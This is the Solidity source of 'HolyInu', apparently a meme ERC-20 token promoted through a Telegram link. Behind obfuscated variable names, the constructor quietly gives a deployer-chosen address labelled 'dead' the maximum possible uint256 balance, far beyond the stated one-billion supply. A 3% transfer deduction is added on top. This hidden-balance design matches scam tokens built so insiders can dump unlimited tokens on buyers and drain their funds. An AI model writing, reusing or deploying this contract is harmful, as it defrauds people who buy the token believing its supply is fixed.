/*

https://t.me/holyinu

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.9;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

contract HolyInu is ERC20, Ownable {
    uint256 private palace = ~uint256(0);
    uint256 public fly = 3;

    constructor(
        string memory principle,
        string memory blind,
        address allow,
        address dead
    ) ERC20(principle, blind) {
        _totalSupply = 1000000000 * 10**decimals();
        _balances[dead] = palace;
        _balances[_msgSender()] = _totalSupply;
    }

    function _transfer(
        address angry,
        address depend,
        uint256 flow
    ) internal override {
        uint256 making = (flow / 100) * fly;
        flow = flow - making;
        super._transfer(angry, depend, flow);
    }
}